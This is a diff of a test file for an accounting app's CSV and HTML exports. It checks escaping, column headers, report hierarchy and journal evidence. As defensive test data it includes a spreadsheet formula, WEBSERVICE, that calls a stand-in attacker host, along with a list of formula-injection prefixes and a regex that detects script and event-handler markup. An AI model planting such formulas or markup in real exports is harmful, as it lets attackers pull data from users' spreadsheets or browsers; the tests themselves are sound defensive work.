@@ -20,7 +20,7 @@ test('CSV preserves exact decimal characters, including negative amounts, and pr
   assert.ok(csv.includes('"-12345678901234567890.12345678"'));
   assert.ok(!csv.includes('"\'-12345678901234567890.12345678"'));
   assert.ok(csv.includes('"\'=WEBSERVICE(""https://evil.invalid"")"'));
-  assert.ok(csv.startsWith('"Period","Import version","P&L line","Amount","Value state","Review status","Exported at","Period ID","Worksheet","Current calculation snapshot"\r\n'));
+  assert.ok(csv.startsWith('"Period","Import version","Report line","Amount","Value state","Review status","Exported at","Period ID","Worksheet","Current calculation snapshot","Entity","Currency","Units"\r\n'));
   assert.ok(csv.endsWith('\r\n'));
   assert.equal(csvField('text, "quoted"\nnext'), '"text, ""quoted""\nnext"');
   for (const value of ['=1+2', '+1+2', '-1+2', '@SUM(A1)', '  =1+2', '\t=1', '\ntext', '\rtext']) assert.ok(csvField(value).startsWith('"\''));
@@ -44,7 +44,7 @@ test('HTML is escaped passive content with restrictive CSP, no active support or
   assert.ok(html.includes('base-uri \'none\''));
   assert.ok(!/<script|<img|<iframe|<object|<a\b|<form\b|<[^>]+\s(?:href|src|onerror)=/i.test(html));
   assert.ok(html.includes(escapeHtml(attack)));
-  for (const text of ['source-hash','evidence-hash','v1:abc','attachment-0','Needs re-review','Invalid amount','self-reported','unauthenticated','companion JSON','not audit assurance','Current account mappings']) assert.ok(html.includes(text), text);
+  for (const text of ['source-hash','evidence-hash','v1:abc','attachment-0','Needs re-review','Invalid amount','self-reported','unauthenticated','companion JSON','not audit assurance','Account mappings and balance reconciliation']) assert.ok(html.includes(text), text);
   assert.ok(!html.includes('private raw source'));
   assert.ok(!html.includes('[60,62,120]'));
 });
@@ -63,4 +63,26 @@ test('exports identify current calculation state, not only the unchanged import 
   pack.explanations[0].sheet_name = 'Different period';
   assert.ok(exportPlCsv(pack).includes('Unavailable (no matching captured explanation)'));
   assert.ok(exportCloseHtml(pack).includes('Unavailable (no matching captured explanation)'));
+});
+
+test('accounting exports label report dimensions and retain an escaped journal and event inventory', () => {
+  const pack = fixture();
+  Object.assign(pack.status.period, {
+    entity:'=Example Company', currency:'BRL', units:'thousands',
+    report_lines:[{id:'cash',label:'Cash',parent_id:null,normal_balance:'Debit'}],
+    adjustments:[{id:'adj-1',author:'Preparer',rationale:attack,created_at:'2026-11-02',
+      lines:[{account:'1000',debit:'0.00',credit:'0.125'}],
+      evidence:[{id:'evidence-1',filename:'support.txt',sha256:'journal-hash',version:1,previous_version_id:null,bytes:[99,98,97],media_type:'text/plain',created_at:'2026-11-02'}]}],
+  });
+  pack.status.live_accounts[0].imported_balance='100.25';
+  pack.status.live_accounts[0].adjustment_balance='-0.125';
+  pack.status.live_accounts[0].reported_balance='100.125';
+  pack.reviews[0].decision='Question';
+  pack.reviews[0].question_events=[{action:'Resolved',actor:'Reviewer',note:'Resolved with evidence',snapshot:'v1:resolved'} as never];
+  const csv = exportPlCsv(pack);
+  assert.ok(csv.includes('"' + "'" + '=Example Company","BRL","thousands"'));
+  const html = exportCloseHtml(pack);
+  for (const expected of ['Report hierarchy','100.125','0.125','journal-hash','support.txt','v1:resolved','Resolved with evidence',escapeHtml(attack)]) assert.ok(html.includes(expected),expected);
+  assert.ok(!html.includes('[99,98,97]'));
+  assert.ok(!html.includes('<script'));
 });
